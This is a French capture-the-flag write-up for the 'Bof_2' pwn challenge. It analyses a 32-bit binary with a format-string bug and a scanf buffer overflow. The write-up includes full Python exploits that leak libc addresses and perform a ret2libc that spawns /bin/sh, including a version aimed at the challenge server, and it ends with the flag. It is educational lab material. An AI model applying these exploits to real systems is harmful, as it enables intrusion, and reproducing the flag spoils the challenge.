# Bof_2

## Analyse

Le binaire `service` est donné pour ce challenge.
A nouveau le titre nous indique que je vais devoir exploiter un Buffer Overflow.

Je regarde les attributs du binaire dans un premier temps.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_2 $ checksec ./service                           
[*] '/home/aether/Documents/ctf/cyberthreatforce/pwn/Bof_2/service'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_2 $ file ./service
./service: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c68e88be2ae184ad3f0ab9657d318a2184c62f0e, not stripped
```

Rien de bien intéressant du côté de la commande `strings`.

Je passe au reverse du binaire pour comprendre son fonctionnement avec son exécution.

La fonction `main` est très courte et permet de repérer rapidement la fonction à exploiter.

```js
undefined4 main(void)
{
  ignorMe(&stack0x00000004);
  vuln();
  puts("oops i have lost my db sorry");
  return 0;
}
```

La fonction `vuln` demande un nom d'utilisateur, puis l'affiche avec un `printf` et demande un mot de passe via `scanf`.

```js
[snip]
  fgets(&username_fmtstr,0x50,stdin);
  sVar2 = strlen(&username_fmtstr);
  (&cStack130)[sVar2] = '\0';
  printf("Bienvenue ");
  printf(&username_fmtstr);
  printf("\npassword: ");
  __isoc99_scanf(&DAT_00012042,password_bfoverflow);
  iVar3 = strcmp(password_bfoverflow,&username_fmtstr);
  if (iVar3 == 0) {
    puts("WTF ?");
  }
```

Il y a donc deux vulnérabilités dans ce programme, la première avec le `printf(&username_fmtstr);` qui permet de faire une format string.
Puis `__isoc99_scanf(&DAT_00012042,password_bfoverflow);` qui permet de faire un buffer overflow.

La format string, va me permettre de leak des adresses et potentiellement des adresses de la libc.

En plaçant un breakpoint sur le second `printf` et en regardant la stack depuis `gdb-peda`, j'apprend que deux addresses de la libc sont disponibles.

```js
0000| 0xffffcf30 --> 0xffffcf4b --> 0x736c ('ls')
0004| 0xffffcf34 --> 0x50 ('P')
0008| 0xffffcf38 --> 0xf7f9d5c0 --> 0xfbad2288 
0012| 0xffffcf3c --> 0x56556207 (<vuln+14>:	add    ebx,0x2df9)
0016| 0xffffcf40 --> 0xf7e35ee7 (<_IO_file_setbuf+7>:	add    ebx,0x167119)
0020| 0xffffcf44 --> 0xf7f9b880 --> 0x0 
0024| 0xffffcf48 --> 0x6cf9dce0 
0028| 0xffffcf4c --> 0x73 ('s')
gdb-peda$ x/x 0xf7f9d5c0
0xf7f9d5c0 <_IO_2_1_stdin_>:	0xfbad2288
```

`_IO_2_1_stdin_` sera la deuxième adresse leak puis `_IO_file_setbuf+7` sera la 4ieme.

Avec le format `%p`, je vais donc pouvoir leak ces deux adresses et récupérer la libc distante grâce au site <https://libc.blukat.me/>.

Suite à cela, il ne me restera plus qu'à faire un ret2libc en calculant l'offset de départ de la libc.

Pour le payload, je récupère l'adresse de `_IO_2_1_stdin_`, avec la libc, je calcule l'offset de départ.
Ce qui me permet de récupérer la fonction `system` ainsi que la string `/bin/sh` puis,
j'overflow et je jump sur la fonction `system` avec comme argument `/bin/sh`.
`ARTH` sera la fonction exécuté après `system` étant donné que je n'ai pas besoin d'en exécuter je peux simplement mettre du garbage sur 4 bytes.

Voila l'exploit local:

```python
#!/usr/bin/env python3

from pwn import *

# LIBC
LIBC = ELF("./libc/libc_local.so")

if __name__ == "__main__":
    # Connect to the challenge
    p = process("./service")
    # Recv the header
    print(p.read())

    # Leak <_IO_2_1_stdin_> and <_IO_file_setbuf+7>
    p.send(b"%p.%p.%p.%p\n")
    libc_leak = p.read()
    io_stdin = libc_leak.split(b".")[1]
    io_file_setbuf = libc_leak.split(b".")[3].splitlines()[0][:-1] + b"0"

    # Garbage
    print(f"[+] Find <_IO_2_1_stdin_>: {io_stdin}")
    print(f"[+] Find <_IO_file_setbuf>: {io_file_setbuf}")

    # Compute libc start
    libc_start = int(io_stdin[2:], 16) - LIBC.symbols["_IO_2_1_stdin_"]
    print(f"[+] libc base address: {hex(libc_start)}")

    # Get system addr
    system_addr = libc_start + LIBC.symbols["system"]
    print(f"[+] system address : {hex(system_addr)}")

    # Get binsh addr
    binsh_addr = libc_start + next(LIBC.search(b"/bin/sh"))
    print(f"[+] /bin/sh address : {hex(binsh_addr)}")

    # Convert to real addr
    system_addr = p32(system_addr)
    binsh_addr = p32(binsh_addr)

    payload_ret2libc = b"".join([
        b"A" * 0x31,# Buffer overflow
        system_addr,
        b"ARTH",
        binsh_addr
    ])

    # Send payload in password
    p.send(payload_ret2libc + b"\n")

    p.interactive()
```

Le test en local concluant.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_2 $ python3.8 local_exploit.py
[*] '/home/aether/Documents/ctf/cyberthreatforce/pwn/Bof_2/libc/libc_local.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './service': pid 14994
b'Hello authentifie toi !\nUsername: '
[+] Find <_IO_2_1_stdin_>: b'0xf7f175c0'
[+] Find <_IO_file_setbuf>: b'0xf7dafee0'
[+] libc base address: 0xf7d3f000
[+] system address : 0xf7d7c2e0
[+] /bin/sh address : 0xf7ebd0af
[*] Switching to interactive mode
$ id
uid=1000(aether) gid=1000(aether) groupes=1000(aether)
```

Je peux changer mon script pour utiliser `socket` à la place de `pwntools`.

```python
#!/usr/bin/env python3

from pwnlib.elf.elf import ELF

import socket
import struct

def p32(addr):
    return struct.pack("<I", addr)

# Connect to the challenge
HOST = "144.217.73.235"
PORT = 21590
# LIBC
LIBC = ELF("./libc/libc6-i386_2.28-10_amd64.so")

def connect(HOST, PORT):
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect((HOST, PORT))
    tcp.settimeout(1)
    return tcp

def recv(tcp):
    data = b""
    while True:
        try:
            data += tcp.recv(1024)
        except socket.timeout:
            break
    return data

if __name__ == "__main__":
    # Connect to the challenge
    tcp = connect(HOST, PORT)
    # Recv the header
    print(recv(tcp))

    # Leak <_IO_2_1_stdin_> and <_IO_file_setbuf+7>
    tcp.send(b"%p.%p.%p.%p\n")
    libc_leak = (recv(tcp))
    io_stdin = libc_leak.split(b".")[1]
    io_file_setbuf = libc_leak.split(b".")[3].splitlines()[0][:-1] + b"0"

    # Garbage
    print(f"[+] Find <_IO_2_1_stdin_>: {io_stdin}")
    print(f"[+] Find <_IO_file_setbuf>: {io_file_setbuf}")

    # Compute libc start
    libc_start = int(io_stdin[2:], 16) - LIBC.symbols["_IO_2_1_stdin_"]
    print(f"[+] libc base address: {hex(libc_start)}")

    # Get system addr
    system_addr = libc_start + LIBC.symbols["system"]
    print(f"[+] system address : {hex(system_addr)}")

    # Get binsh addr
    binsh_addr = libc_start + next(LIBC.search(b"/bin/sh"))
    print(f"[+] /bin/sh address : {hex(binsh_addr)}")

    # Convert to real addr
    system_addr = p32(system_addr)
    binsh_addr = p32(binsh_addr)

    payload_ret2libc = b"".join([
        b"A" * 0x31,# Buffer overflow
        system_addr,
        b"ARTH",
        binsh_addr
    ])

    # Send payload in password
    tcp.send(payload_ret2libc + b"\n")

    while True:
        try:
            tcp.send(input(">>> ").encode() + b"\n")
            print(tcp.recv(1024).decode().strip())
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            exit(0)
```

A nouveau le flag se situe sous `/home/ctf/flag.txt`.

flag: `CYBERTF{l3@ks_I5_Us3Fu11}`
